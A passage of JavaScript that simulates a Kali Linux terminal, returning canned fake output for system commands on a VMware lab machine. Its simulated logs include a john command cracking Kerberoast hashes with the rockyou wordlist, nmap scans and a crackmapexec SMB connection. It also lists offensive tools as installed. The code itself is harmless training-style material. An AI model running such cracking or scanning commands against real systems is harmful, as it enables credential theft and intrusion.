      { t: 'BIOS Model name:                 Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz  CPU @ 3.8GHz' },
      { t: 'CPU family:                      6' },
      { t: 'Model:                           165' },
      { t: 'Thread(s) per core:              2' },
      { t: 'Core(s) per socket:              4' },
      { t: 'Socket(s):                       1' },
      { t: 'Stepping:                        5' },
      { t: 'CPU max MHz:                     5100.0000', cls: 'y' },
      { t: 'CPU min MHz:                     800.0000' },
      { t: 'BogoMIPS:                        7600.00' },
      { t: 'Virtualization:                  VT-x', cls: 'c' },
      { t: 'L1d cache:                       128 KiB (4 instances)' },
      { t: 'L1i cache:                       128 KiB (4 instances)' },
      { t: 'L2 cache:                        1 MiB (4 instances)' },
      { t: 'L3 cache:                        16 MiB (1 instance)', cls: 'g' },
      { t: 'NUMA node(s):                    1' },
      { t: 'NUMA node0 CPU(s):               0-3' },
      { t: 'Vulnerability Itlb multihit:     Not affected' },
      { t: 'Vulnerability L1tf:              Not affected' },
      { t: 'Vulnerability Mds:               Not affected' },
      { t: 'Vulnerability Meltdown:          Not affected' },
      { t: 'Vulnerability Mmio stale data:   Mitigation; Clear CPU buffers; SMT vulnerable', cls: 'y' },
      { t: 'Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl', cls: 'y' },
      { t: 'Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization', cls: 'y' },
      { t: 'Vulnerability Spectre v2:        Mitigation; Enhanced / Automatic IBRS; IBPB conditional; RSB filling', cls: 'y' },
      { t: 'Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc art arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid mpx rdseed adx smap clflushopt intel_pt xsaveopt xsavec xgetbv1 xsaves dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp md_clear flush_l1d arch_capabilities', cls: 'd' },
    ],
  },

  // ── lsblk ─────────────────────────────────────────────────────────────────
  {
    match: c => /^lsblk(\s|$)/.test(c),
    loadTime: () => jitter(250, 70),
    lines: [
      { t: 'NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS' },
      { t: 'sda           8:0    0    50G  0 disk ', cls: 'b' },
      { t: '├─sda1        8:1    0    48G  0 part /', cls: 'g' },
      { t: '└─sda2        8:2    0     2G  0 part [SWAP]', cls: 'd' },
      { t: 'sr0          11:0    1  1024M  0 rom  ', cls: 'd' },
    ],
  },

  // ── lspci ─────────────────────────────────────────────────────────────────
  {
    match: c => /^lspci(\s|$)/.test(c),
    loadTime: () => jitter(350, 80),
    lines: [
      { t: '00:00.0 Host bridge: Intel Corporation 440BX/ZX/DX - 82443BX/ZX/DX Host bridge (rev 01)' },
      { t: '00:01.0 PCI bridge: Intel Corporation 440BX/ZX/DX - 82443BX/ZX/DX AGP bridge (rev 01)' },
      { t: '00:07.0 ISA bridge: Intel Corporation 82371AB/EB/MB PIIX4 ISA (rev 08)' },
      { t: '00:07.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)' },
      { t: '00:07.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 08)' },
      { t: '00:07.7 System peripheral: VMware Virtual Machine Communication Interface (rev 10)' },
      { t: '00:0f.0 VGA compatible controller: VMware SVGA II Adapter', cls: 'g' },
      { t: '00:10.0 SCSI storage controller: Broadcom / LSI 53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI' },
      { t: '00:11.0 PCI bridge: VMware PCI bridge (rev 02)' },
      { t: '00:15.0 PCI bridge: VMware PCI Express Root Port (rev 01)' },
      { t: '02:00.0 USB controller: VMware USB2 EHCI Controller', cls: 'b' },
      { t: '02:01.0 Ethernet controller: VMware VMXNET3 Ethernet Controller (rev 01)', cls: 'g' },
      { t: '02:02.0 Multimedia audio controller: Ensoniq ES1371/ES1373 / Creative Labs CT2518 (rev 02)' },
      { t: '02:03.0 SATA controller: VMware SATA AHCI controller', cls: 'b' },
    ],
  },

  // ── lsusb ─────────────────────────────────────────────────────────────────
  {
    match: c => /^lsusb(\s|$)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [
      { t: 'Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub', cls: 'b' },
      { t: 'Bus 001 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse' },
      { t: 'Bus 001 Device 003: ID 0e0f:0002 VMware, Inc. Virtual Keyboard' },
      { t: 'Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub', cls: 'b' },
      { t: 'Bus 002 Device 002: ID 0e0f:0008 VMware, Inc. VMware Virtual USB Hub' },
    ],
  },

  // ── hostnamectl ───────────────────────────────────────────────────────────
  {
    match: c => /^hostnamectl(\s|$)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [
      { t: '   Static hostname: kali', cls: 'b' },
      { t: '         Icon name: computer-vm' },
      { t: '           Chassis: vm 🖥' },
      { t: () => `        Machine ID: d4a8f2c1b3e5a7d9f1c3e5b7a9d1f3c5` },
      { t: '           Boot ID: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6' },
      { t: '    Virtualization: vmware', cls: 'y' },
      { t: '  Operating System: Kali GNU/Linux Rolling', cls: 'g' },
      { t: '       OS Arch: x86-64' },
      { t: '            Kernel: Linux 6.6.9-amd64', cls: 'g' },
      { t: '      Architecture: x86-64' },
      { t: '   Hardware Vendor: VMware, Inc.' },
      { t: '    Hardware Model: VMware Virtual Platform' },
      { t: '  Firmware Version: 6.00' },
      { t: '     Firmware Date: Thu 2020-11-12' },
      { t: '      Firmware Age: 3y 2month 2d' },
    ],
  },

  // ── timedatectl ───────────────────────────────────────────────────────────
  {
    match: c => /^timedatectl(\s|$)/.test(c),
    loadTime: () => jitter(280, 70),
    lines: [{ t: () => {
      const now = new Date();
      const utc = now.toUTCString().replace('GMT', 'UTC');
      return [
        `               Local time: ${now.toString().replace(/ \(.+\)/,'')}`,
        `           Universal time: ${utc}`,
        `                 RTC time: ${utc}`,
        `                Time zone: America/New_York (EST, -0500)`,
        `System clock synchronized: yes`,
        `              NTP service: active`,
        `          RTC in local TZ: no`,
      ].join('\n');
    }}],
  },

  // ── dmidecode ─────────────────────────────────────────────────────────────
  {
    match: c => /^dmidecode(\s|$)/.test(c),
    requireRoot: true,
    loadTime: () => jitter(500, 120),
    lines: [
      { t: '# dmidecode 3.5', cls: 'd' },
      { t: 'Getting SMBIOS data from sysfs.' },
      { t: 'SMBIOS 2.7 present.' },
      { t: '' },
      { t: 'Handle 0x0001, DMI type 1, 27 bytes', cls: 'b' },
      { t: 'System Information' },
      { t: '\tManufacturer: VMware, Inc.' },
      { t: '\tProduct Name: VMware Virtual Platform' },
      { t: '\tVersion: None' },
      { t: '\tSerial Number: VMware-56 4d 2f 8a b2 c1 3d e4-89 f0 12 34 56 78 9a bc' },
      { t: '\tUUID: 564d2f8a-b2c1-3de4-89f0-123456789abc' },
      { t: '\tWake-up Type: Power Switch' },
      { t: '' },
      { t: 'Handle 0x0002, DMI type 2, 15 bytes', cls: 'b' },
      { t: 'Base Board Information' },
      { t: '\tManufacturer: Intel Corporation' },
      { t: '\tProduct Name: 440BX Desktop Reference Platform' },
      { t: '\tVersion: None' },
      { t: '' },
      { t: 'Handle 0x0004, DMI type 4, 48 bytes', cls: 'b' },
      { t: 'Processor Information' },
      { t: '\tSocket Designation: CPU socket #0' },
      { t: '\tType: Central Processor' },
      { t: '\tFamily: Xeon' },
      { t: '\tManufacturer: GenuineIntel' },
      { t: '\tID: EA 06 00 00 FF FB EB BF' },
      { t: '\tVersion: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz' },
      { t: '\tVoltage: 3.3 V' },
      { t: '\tExternal Clock: 100 MHz' },
      { t: '\tMax Speed: 3800 MHz' },
      { t: '\tCurrent Speed: 3800 MHz' },
      { t: '\tStatus: Populated, Enabled' },
      { t: '\tCore Count: 4' },
      { t: '\tThread Count: 8' },
      { t: '' },
      { t: 'Handle 0x0017, DMI type 17, 92 bytes', cls: 'b' },
      { t: 'Memory Device' },
      { t: '\tArray Handle: 0x0016' },
      { t: '\tTotal Width: 64 bits' },
      { t: '\tData Width: 64 bits' },
      { t: '\tSize: 8 GB' },
      { t: '\tForm Factor: DIMM' },
      { t: '\tLocator: DIMM 0' },
      { t: '\tType: RAM' },
      { t: '\tSpeed: 3200 MT/s' },
      { t: '\tManufacturer: Kingston' },
      { t: '\tSerial Number: 00000001' },
      { t: '\tPart Number: KHX3200C16D4/8GX' },
      { t: '\tConfigured Memory Speed: 3200 MT/s' },
    ],
  },

  // ── vmstat ────────────────────────────────────────────────────────────────
  {
    match: c => /^vmstat(\s|$)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [
      { t: 'procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----', cls: 'b' },
      { t: ' r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st' },
      { t: ' 1  0      0 4325632 213456  935472    0    0     1     4  167  423  2  1 97  0  0', cls: 'g' },
    ],
  },

  // ── iostat ────────────────────────────────────────────────────────────────
  {
    match: c => /^iostat(\s|$)/.test(c),
    loadTime: () => jitter(350, 90),
    lines: [
      { t: () => `Linux 6.6.9-amd64 (kali) \t${new Date().toLocaleDateString('en-US',{month:'2-digit',day:'2-digit',year:'numeric'})} \t_x86_64_\t(4 CPU)` },
      { t: '' },
      { t: 'avg-cpu:  %user   %nice %system %iowait  %steal   %idle', cls: 'b' },
      { t: '           2.28    0.00    0.82    0.21    0.00   96.69' },
      { t: '' },
      { t: 'Device             tps    kB_read/s    kB_wrtn/s    kB_dscd/s    kB_read    kB_wrtn    kB_dscd', cls: 'b' },
      { t: 'sda               1.23         3.21        12.45         0.00      48291     187432          0', cls: 'g' },
    ],
  },

  // ── sysctl ────────────────────────────────────────────────────────────────
  {
    match: c => /^sysctl(\s|$)/.test(c),
    loadTime: () => jitter(200, 60),
    lines: [{ t: (cmd) => {
      if (cmd.includes('net.ipv4.ip_forward')) return 'net.ipv4.ip_forward = 1';
      if (cmd.includes('kernel.hostname'))     return 'kernel.hostname = kali';
      if (cmd.includes('-a') || cmd.includes('--all')) return [
        'abi.vsyscall32 = 1',
        'debug.exception-trace = 1',
        'fs.file-max = 9223372036854775807',
        'kernel.hostname = kali',
        'kernel.osrelease = 6.6.9-amd64',
        'kernel.ostype = Linux',
        'kernel.pid_max = 4194304',
        'net.core.rmem_max = 212992',
        'net.ipv4.conf.all.forwarding = 1',
        'net.ipv4.ip_forward = 1',
        'net.ipv4.tcp_fin_timeout = 60',
        'net.ipv4.tcp_keepalive_time = 7200',
        'vm.swappiness = 60',
        'vm.dirty_ratio = 20',
      ].join('\n');
      return `sysctl: cannot stat /proc/sys/${cmd.split(' ').pop().replace(/\./g,'/')}: No such file or directory`;
    }}],
  },

  // ── lsmod ─────────────────────────────────────────────────────────────────
  {
    match: c => c === 'lsmod',
    loadTime: () => jitter(200, 60),
    lines: [
      { t: 'Module                  Size  Used by', cls: 'b' },
      { t: 'nf_nat                 57344  3 nft_nat,xt_nat,nf_nat_masquerade_ipv4' },
      { t: 'nf_conntrack          180224  6 nf_nat,nft_ct,xt_conntrack,nf_nat_masquerade_ipv4,nf_conntrack_netlink,xt_MASQUERADE' },
      { t: 'nft_compat             20480  34' },
      { t: 'nf_tables             299008  438 nft_compat,nft_ct,nft_nat' },
      { t: 'vmw_vsock_vmci_transport    32768  0' },
      { t: 'vmw_vmci               77824  1 vmw_vsock_vmci_transport' },
      { t: 'vmwgfx                393216  2', cls: 'b' },
      { t: 'drm_ttm_helper         16384  1 vmwgfx' },
      { t: 'ttm                    77824  2 vmwgfx,drm_ttm_helper' },
      { t: 'drm_kms_helper        221184  1 vmwgfx' },
      { t: 'e1000                 155648  0', cls: 'g' },
      { t: 'vmxnet3                73728  0', cls: 'g' },
      { t: 'ata_piix               32768  2' },
      { t: 'libata                266240  2 ata_piix,ahci' },
      { t: 'scsi_mod              266240  4 libata,sd_mod,scsi_transport_spi,mptspi' },
    ],
  },

  // ── dmesg ────────────────────────────────────────────────────────────────
  {
    match: c => /^dmesg(\s|$)/.test(c),
    loadTime: () => jitter(400, 100),
    lines: [
      { t: '[    0.000000] Linux version 6.6.9-amd64 (debian-kernel@lists.debian.org) (gcc-13 (Debian 13.2.0-13) 13.2.0, GNU ld (GNU Binutils for Debian) 2.41) #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)', cls: 'b' },
      { t: '[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-6.6.9-amd64 root=/dev/sda1 ro quiet splash' },
      { t: '[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009efff] usable' },
      { t: '[    0.000000] BIOS-e820: [mem 0x000000000009f000-0x00000000000fffff] reserved' },
      { t: '[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable' },
      { t: '[    0.000000] NX (Execute Disable) protection: active', cls: 'g' },
      { t: '[    0.000000] SMBIOS 2.7 present.' },
      { t: '[    0.000000] DMI: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020' },
      { t: '[    0.000000] Hypervisor detected: VMware', cls: 'y' },
      { t: '[    0.000000] tsc: Detected 3800.000 MHz processor' },
      { t: '[    0.235718] ACPI: IRQ0 used by override.' },
      { t: '[    0.246891] PCI: Using configuration type 1 for base access' },
      { t: '[    0.892314] NET: Registered PF_PACKET protocol family' },
      { t: '[    0.934521] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x36d8e3f9938, max_idle_ns: 881590580619 ns' },
      { t: '[    1.123456] AppArmor: AppArmor initialized', cls: 'g' },
      { t: '[    1.234567] audit: type=1400 audit(1705313341.000:2): apparmor="STATUS" operation="profile_load" profile="unconfined" name="nvidia_modprobe"' },
      { t: '[    1.456789] e1000: Intel(R) PRO/1000 Network Driver', cls: 'b' },
      { t: '[    1.457891] e1000: Copyright (c) 1999-2006 Intel Corporation.' },
      { t: '[    1.502341] SCSI subsystem initialized' },
      { t: '[    1.823456] ata1: SATA max UDMA/133 cmd 0x1f0 ctl 0x3f6 bmdma 0xc000 irq 14', cls: 'b' },
      { t: '[    2.012345] EXT4-fs (sda1): mounted filesystem with ordered data mode. Quota mode: none.', cls: 'g' },
      { t: '[    2.134567] NET: Registered PF_INET6 protocol family' },
      { t: '[    2.456789] Bluetooth: Core ver 2.22' },
      { t: '[    2.567890] NET: Registered PF_BLUETOOTH protocol family' },
      { t: '[    3.234567] systemd[1]: systemd 252.22-1~deb12u1 running in system mode', cls: 'g' },
      { t: '[    3.456789] systemd[1]: Detected virtualization vmware.', cls: 'y' },
      { t: '[    3.678901] systemd[1]: Detected architecture x86-64.' },
      { t: '[   12.345678] audit: type=1400 audit(1705313351.000:42): apparmor="STATUS" operation="profile_replace" name="dhclient"' },
      { t: '[   14.456789] e1000 0000:02:01.0 eth0: renamed from ens33', cls: 'b' },
    ],
  },

  // ── journalctl ────────────────────────────────────────────────────────────
  {
    match: c => /^journalctl(\s|$)/.test(c),
    loadTime: () => jitter(600, 150),
    lines: [
      { t: '-- Logs begin at Mon 2024-01-15 12:09:01 EST, end at Mon 2024-01-15 14:23:01 EST. --', cls: 'd' },
      { t: 'Jan 15 12:09:01 kali systemd[1]: Starting Kali GNU/Linux Rolling...', cls: 'b' },
      { t: 'Jan 15 12:09:02 kali kernel: Linux version 6.6.9-amd64' },
      { t: 'Jan 15 12:09:02 kali kernel: Command line: BOOT_IMAGE=/vmlinuz-6.6.9-amd64 root=/dev/sda1 ro quiet splash' },
      { t: 'Jan 15 12:09:03 kali systemd[1]: Starting Network Time Synchronization...' },
      { t: 'Jan 15 12:09:04 kali systemd[1]: Started Network Time Synchronization.', cls: 'g' },
      { t: 'Jan 15 12:09:05 kali systemd[1]: Starting Network Service...' },
      { t: 'Jan 15 12:09:05 kali NetworkManager[432]: <info>  [1705313345.0000] NetworkManager (version 1.44.2) is starting' },
      { t: 'Jan 15 12:09:06 kali NetworkManager[432]: <info>  [1705313346.0000] Read config: /etc/NetworkManager/NetworkManager.conf' },
      { t: 'Jan 15 12:09:08 kali NetworkManager[432]: <info>  [1705313348.0000] device (eth0): state change: config -> ip-config (reason \'none\', sys-iface-state: \'managed\')' },
      { t: 'Jan 15 12:09:10 kali dhclient[612]: DHCPREQUEST for 10.10.10.5 on eth0 to 255.255.255.255 port 67', cls: 'b' },
      { t: 'Jan 15 12:09:10 kali dhclient[612]: DHCPACK of 10.10.10.5 from 10.10.10.1', cls: 'g' },
      { t: 'Jan 15 12:09:12 kali sshd[591]: Server listening on 0.0.0.0 port 22.', cls: 'g' },
      { t: 'Jan 15 12:09:12 kali sshd[591]: Server listening on :: port 22.' },
      { t: 'Jan 15 12:10:03 kali gdm-launch-environment[811]: pam_unix(gdm-launch-environment:session): session opened for user gdm(uid=115) by (uid=0)' },
      { t: 'Jan 15 12:10:15 kali sudo[1022]: pam_unix(sudo:auth): authentication failure; logname=kali uid=1000 euid=0 tty=/dev/pts/0 ruser=kali rhost=  user=kali', cls: 'y' },
      { t: 'Jan 15 12:10:20 kali sudo[1023]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -sn 10.10.10.0/24', cls: 'b' },
      { t: 'Jan 15 14:18:04 kali sudo[1289]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -sV -sC 10.10.10.10', cls: 'b' },
      { t: 'Jan 15 14:22:31 kali sudo[1421]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'b' },
      { t: '-- No entries -- (use journalctl --no-pager for full output)', cls: 'd' },
    ],
  },

  // ── ss — improved with -tulpn support ────────────────────────────────────
  {
    match: c => /^ss\s.*(-t|-u|-l|-p|-n|tulpn|antp)/.test(c) || /^netstat\s.*(-t|-u|-l|-p|-n|tulpn)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [
      { t: 'Netid  State    Recv-Q  Send-Q  Local Address:Port     Peer Address:Port  Process', cls: 'b' },
      { t: 'tcp    LISTEN   0       128     0.0.0.0:22              0.0.0.0:*          users:(("sshd",pid=591,fd=3))', cls: 'g' },
      { t: 'tcp    LISTEN   0       128     127.0.0.1:631           0.0.0.0:*          users:(("cupsd",pid=798,fd=7))' },
      { t: 'tcp    LISTEN   0       5       127.0.0.53%lo:53        0.0.0.0:*          users:(("systemd-resolve",pid=412,fd=13))' },
      { t: 'tcp    ESTAB    0       0       10.10.10.5:51234        10.10.10.10:445    users:(("crackmapexec",pid=1201,fd=5))', cls: 'y' },
      { t: 'tcp6   LISTEN   0       128     [::]:22                 [::]:*             users:(("sshd",pid=591,fd=4))' },
      { t: 'udp    UNCONN   0       0       127.0.0.53%lo:53        0.0.0.0:*          users:(("systemd-resolve",pid=412,fd=12))' },
      { t: 'udp    UNCONN   0       0       0.0.0.0:68              0.0.0.0:*          users:(("dhclient",pid=612,fd=7))' },
    ],
  },

  // ── iptables ──────────────────────────────────────────────────────────────
  {
    match: c => /^iptables(\s|$)/.test(c),
    requireRoot: true,
    loadTime: () => jitter(400, 100),
    lines: [
      { t: 'Chain INPUT (policy ACCEPT)', cls: 'g' },
      { t: 'target     prot opt source               destination' },
      { t: '' },
      { t: 'Chain FORWARD (policy DROP)', cls: 'r' },
      { t: 'target     prot opt source               destination' },
      { t: '' },
      { t: 'Chain OUTPUT (policy ACCEPT)', cls: 'g' },
      { t: 'target     prot opt source               destination' },
    ],
  },

  // ── nft ───────────────────────────────────────────────────────────────────
  {
    match: c => /^nft(\s|$)/.test(c),
    requireRoot: true,
    loadTime: () => jitter(350, 90),
    lines: [
      { t: 'table inet filter {', cls: 'b' },
      { t: '\tchain input {' },
      { t: '\t\ttype filter hook input priority filter; policy accept;' },
      { t: '\t}' },
      { t: '\tchain forward {' },
      { t: '\t\ttype filter hook forward priority filter; policy drop;' },
      { t: '\t}' },
      { t: '\tchain output {' },
      { t: '\t\ttype filter hook output priority filter; policy accept;' },
      { t: '\t}' },
      { t: '}' },
    ],
  },

  // ── dig / nslookup ────────────────────────────────────────────────────────
  {
    match: c => /^dig\s/.test(c) || /^nslookup\s/.test(c),
    loadTime: () => jitter(200, 80),
    lines: [{ t: (cmd) => {
      const isDig = cmd.startsWith('dig');
      const target = cmd.split(' ').pop();
      if (isDig) return [
        `; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> ${cmd.replace('dig ','').trim()}`,
        ';; global options: +cmd',
        ';; Got answer:',
        `;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: ${Math.floor(Math.random()*60000)+1000}`,
        ';; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1',
        '',
        ';; QUESTION SECTION:',
        `;${target}.                       IN      A`,
        '',
        ';; ANSWER SECTION:',
        `${target}.              600     IN      A       10.10.10.10`,
        '',
        ';; Query time: 2 msec',
        `;; SERVER: 10.10.10.10#53(10.10.10.10) (UDP)`,
        `;; WHEN: ${new Date().toUTCString()}`,
        ';; MSG SIZE  rcvd: 55',
      ].join('\n');
      return [
        'Server:\t\t10.10.10.10',
        'Address:\t10.10.10.10#53',
        '',
        `Name:\t${target}`,
        'Address: 10.10.10.10',
      ].join('\n');
    }, cls: (cmd) => cmd.startsWith('dig') ? 'g' : ''}],
  },

  // ── traceroute / tracepath ────────────────────────────────────────────────
  {
    match: c => /^(traceroute|tracepath|mtr)\s/.test(c),
    loadTime: () => jitter(1800, 400),
    lines: [{ t: (cmd) => {
      const target = cmd.split(' ').pop();
      return [
        `traceroute to ${target} (10.10.10.10), 30 hops max, 60 byte packets`,
        ` 1  10.10.10.1 (10.10.10.1)  0.412 ms  0.388 ms  0.374 ms`,
        ` 2  10.10.10.10 (10.10.10.10)  1.234 ms  1.198 ms  1.267 ms`,
      ].join('\n');
    }, cls: 'g'}],
  },

  // ── tcpdump ───────────────────────────────────────────────────────────────
  {
    match: c => /^tcpdump(\s|$)/.test(c),
    requireRoot: true,
    loadTime: () => jitter(3000, 800),
    lines: [
      { t: () => `tcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes` },
      { t: () => `${new Date().toUTCString().slice(17,25)} IP 10.10.10.5.51234 > 10.10.10.10.445: Flags [S], seq 1234567890, win 64240, options [mss 1460,sackOK,TS val 1234567890 ecr 0,nop,wscale 7], length 0`, cls: 'g' },
      { t: () => `${new Date().toUTCString().slice(17,25)} IP 10.10.10.10.445 > 10.10.10.5.51234: Flags [S.], seq 987654321, ack 1234567891, win 65535, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0`, cls: 'b' },
      { t: () => `${new Date().toUTCString().slice(17,25)} IP 10.10.10.5.51234 > 10.10.10.10.445: Flags [.], ack 1, win 502, length 0` },
      { t: '' },
      { t: '3 packets captured' },
      { t: '3 packets received by filter' },
      { t: '0 packets dropped by kernel', cls: 'g' },
    ],
  },

  // ── dpkg ─────────────────────────────────────────────────────────────────
  {
    match: c => /^dpkg(\s|$)/.test(c) || /^apt\s+list/.test(c),
    loadTime: () => jitter(800, 200),
    lines: [{ t: (cmd) => {
      const pkgs = [
        ['adduser',            '3.134',                    'all',   'add and remove users and groups'],
        ['apt',               '2.7.6',                    'amd64', 'commandline package manager'],
        ['bash',              '5.2.21-2',                 'amd64', 'GNU Bourne Again SHell'],
        ['binutils',          '2.42',                     'amd64', 'GNU assembler, linker and binary utilities'],
        ['bzip2',             '1.0.8-5',                  'amd64', 'high-quality block-sorting file compressor'],
        ['crackmapexec',      '5.4.0-1kali2',             'all',   'Network authentication attack tool'],
        ['curl',              '8.5.0-2',                  'amd64', 'command line tool for transferring data with URL syntax'],
        ['enum4linux',        '0.9.1-2kali2',             'all',   'Windows/Samba enumeration tool'],
        ['ffuf',              '2.1.0-1kali1',             'amd64', 'web fuzzer written in Go'],
        ['gcc',               '4:13.2.0-7',               'amd64', 'GNU C compiler'],
        ['gdb',               '14.1-2',                   'amd64', 'GNU Debugger'],
        ['git',               '1:2.43.0-1',               'amd64', 'fast, scalable, distributed revision control system'],
        ['gobuster',          '3.6.0-1kali1',             'amd64', 'directory/vhost fuzzer in Go'],
        ['hashcat',           '6.2.6+ds1-1kali2',         'amd64', 'World\'s fastest and most advanced password recovery utility'],
        ['hydra',             '9.5-1kali1',               'amd64', 'very fast network log-on cracker'],
        ['impacket-scripts',  '0.11.0-1kali3',            'all',   'Python network protocol library scripts'],
        ['john',              '1.9.0-jumbo-1+8.1kali3',   'amd64', 'active password cracking tool'],
        ['kerbrute',          '1.0.3-0kali1',             'amd64', 'fast Kerberos user enumeration tool'],
        ['kali-linux-headless','2023.4.0',                 'all',   'Kali Linux headless system'],
        ['nmap',              '7.94+git20230807.3be01efb1', 'amd64','The Network Mapper'],
        ['openssl',           '3.1.5-1',                  'amd64', 'Secure Sockets Layer toolkit - cryptographic utility'],
        ['python3',           '3.11.8-1',                 'amd64', 'interactive high-level object-oriented language'],
        ['python3-impacket',  '0.11.0-1kali2',            'all',   'Python network protocol library'],
        ['ssh',               '1:9.6p1-3',                'amd64', 'secure shell client and server (metapackage)'],
        ['tcpdump',           '4.99.4-3',                 'amd64', 'command-line network traffic analyzer'],
        ['wget',              '1.21.4-1',                 'amd64', 'retrieves files from the web'],
        ['wireshark',         '4.2.2-1~kali1',            'amd64', 'network traffic analyzer'],
        ['wordlists',         '2023.3.7',                 'all',   'Contains the rockyou.txt wordlist'],
      ];
      if (cmd.includes('apt list')) {
        return 'Listing... Done\n' + pkgs.map(([n,v,a]) => `${n}/${a} ${v} ${a} [installed]`).join('\n');
      }
      if (cmd.includes('-s') || cmd.includes('--status')) {
        const pkg = cmd.split(' ').pop();
        const p = pkgs.find(x => x[0] === pkg) || [pkg, '0.0.0', 'amd64', 'Package not found'];
        return `Package: ${p[0]}\nStatus: install ok installed\nPriority: optional\nSection: misc\nInstalled-Size: 4096\nMaintainer: Kali Developers <devel@kali.org>\nArchitecture: ${p[2]}\nVersion: ${p[1]}\nDescription: ${p[3]}`;
      }
      const hdr = 'Desired=Unknown/Install/Remove/Purge/Hold\n| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)\n||/ Name                      Version                      Architecture Description\n+++-=========================-============================-============-====================================';
      return hdr + '\n' + pkgs.map(([n,v,a,d]) => `ii  ${n.padEnd(25)} ${v.padEnd(28)} ${a.padEnd(12)} ${d}`).join('\n');
    }}],
  },

  // ── stat ──────────────────────────────────────────────────────────────────
  {
    match: c => /^stat\s/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^stat\s+/, '').trim();
      const name = arg.split('/').pop();
      const isDir = ['Desktop','Documents','Downloads','/','etc','home','root'].some(d => arg.includes(d) && !arg.includes('.'));
      if (isDir) return [
        `  File: ${arg}`,
        `  Size: 4096\t\tBlocks: 8\t IO Block: 4096   directory`,
        `Device: 8,1\tInode: 131073\t Links: 20`,
        `Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)`,
        `Access: 2024-01-15 12:10:33.000000000 -0500`,
        `Modify: 2024-01-15 12:09:01.000000000 -0500`,
        `Change: 2024-01-15 12:09:01.000000000 -0500`,
        ` Birth: 2024-01-10 08:00:00.000000000 -0500`,
      ].join('\n');
      const uid = SIM.user === 'root' ? '0/    root' : '1000/    kali';
      return [
        `  File: ${name}`,
        `  Size: 248\t\tBlocks: 8\t IO Block: 4096   regular file`,
        `Device: 8,1\tInode: 1310722\t Links: 1`,
        `Access: (0644/-rw-r--r--)  Uid: (${uid})   Gid: (${uid})`,
        `Access: 2024-01-15 12:10:33.000000000 -0500`,
        `Modify: 2024-01-10 08:23:15.000000000 -0500`,
        `Change: 2024-01-10 08:23:15.000000000 -0500`,
        ` Birth: 2024-01-10 08:23:15.000000000 -0500`,
      ].join('\n');
    }}],
  },

  // ── file ─────────────────────────────────────────────────────────────────
  {
    match: c => /^file\s/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^file\s+/, '').trim();
      if (arg.endsWith('.kerberoast') || arg.endsWith('.txt')) {
        return `${arg}: ASCII text`;
      }
      if (arg.endsWith('.py')) return `${arg}: Python script, ASCII text executable`;
      if (arg.endsWith('.sh')) return `${arg}: Bourne-Again shell script, ASCII text executable`;
      if (arg.startsWith('/usr/bin/') || arg.startsWith('/bin/') || arg.startsWith('/sbin/')) {
        return `${arg}: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0, for GNU/Linux 3.2.0, stripped`;
      }
      return `${arg}: cannot open \`${arg}' (No such file or directory)`;
    }, cls: (cmd) => {
      const arg = cmd.replace(/^file\s+/, '').trim();
